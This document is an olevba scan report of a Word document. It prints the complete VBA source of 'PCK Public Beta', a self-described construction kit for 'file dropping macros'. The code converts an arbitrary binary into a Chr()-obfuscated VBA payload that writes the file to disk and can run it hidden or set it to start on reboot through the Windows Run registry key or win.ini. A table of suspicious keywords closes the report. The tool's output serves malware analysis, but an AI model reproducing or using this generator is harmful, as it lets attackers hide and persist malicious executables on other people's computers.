olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Execute_PCK()
PCK.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO PCK.frm 
in file: Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be - OLE stream: 'Macros/VBA/PCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim PayloadString As String
Dim TmpStr As Integer
Dim OutStr As String
Private Sub Create_Click()
If OptionButton1.Value = True Then RunStr = ""
If OptionButton2.Value = True Then RunStr = "Shell " & Chr(34) & FTD.Text & Chr(34) & ", vbHide"
If OptionButton3.Value = True Then RunStr = "System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" & Chr(34) & ", " & Chr(34) & "PCK Public Beta" & Chr(34) & ") = " & Chr(34) & FTD.Text & Chr(34)
If OptionButton4.Value = True Then RunStr = "System.PrivateProfileString(" & Chr(34) & "C:\Windows\Win.ini" & Chr(34) & ", " & Chr(34) & "windows" & Chr(34) & ", " & Chr(34) & "run" & Chr(34) & ") = " & Chr(34) & FTD.Text & Chr(34)
Open FTC.Text For Binary As #1
PayloadString = Input(LOF(1), #1)
Close #1
For X = 1 To Len(PayloadString)
Y = Y + 1
TmpStr = Asc(Mid(PayloadString, X, 1))
OutStr = OutStr & "Chr(" & TmpStr & ")"
If X < Len(PayloadString) Then OutStr = OutStr & " + "
If Y = 10 Then
If X < Len(PayloadString) Then OutStr = OutStr & "_" & Chr(13) & Chr(10)
Y = 0
End If
Next X
Open SourceOut.Text For Output As #1
Print #1, "Sub Payload()"
Print #1, "Open " & Chr(34) & FTD.Text & Chr(34) & " For Output As #1"
Print #1, "Print #1, " & OutStr
Print #1, "Close #1"
Print #1, RunStr
Print #1, "End Sub"
Close #1
End Sub
'PCK Public Beta is property
'of the public, hence the name.
'Feel free to modify PCK... Be
'sure to send me a copy of your
'changes. And by the way if you
'do change PCK, please acknowledge
'that I was The original creator.
'Thank you for your interest, Lys
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PCK Public Beta�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aboutubl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Setupubl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Createbl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ich Bin Ein...a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Umm...n 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Play With It...�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Output And Destruct!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i106/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This was written to speed up the process of making file dropping macros. I've written this for myself and decided to make it public. If you want to see an update, I expect some feedback. One can email me at either:  lyskovick@altern.org lys_kovick@hotmail.com
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i106/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\command.como
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\command.como
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Do Not Execute Payload@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Execute Payload Upon Dropping
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Edit Registry To Execute Payload Upon Reboot
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Edit Win.ini To Execute Payload Upon Reboot
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\payload.txto
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Large files may lock up PCK... If that's the case, hit Ctrl + Break and choose a smaller file! If you know of a way that I can better PCK please send me an email!@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM Variable "b'MultiPage1'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "None" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'PCK'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'About'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Setup'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Create'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i106'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'FTC'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\command.com'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'FTD'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\command.com'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image3'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'SourceOut'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\payload.txt'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Create'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.PCK-a14146cb0603023bc3c41af12ecb8583eb9e62be' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Create_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|DESTao              |44455354616F                                 |
+----------+--------------------+---------------------------------------------+
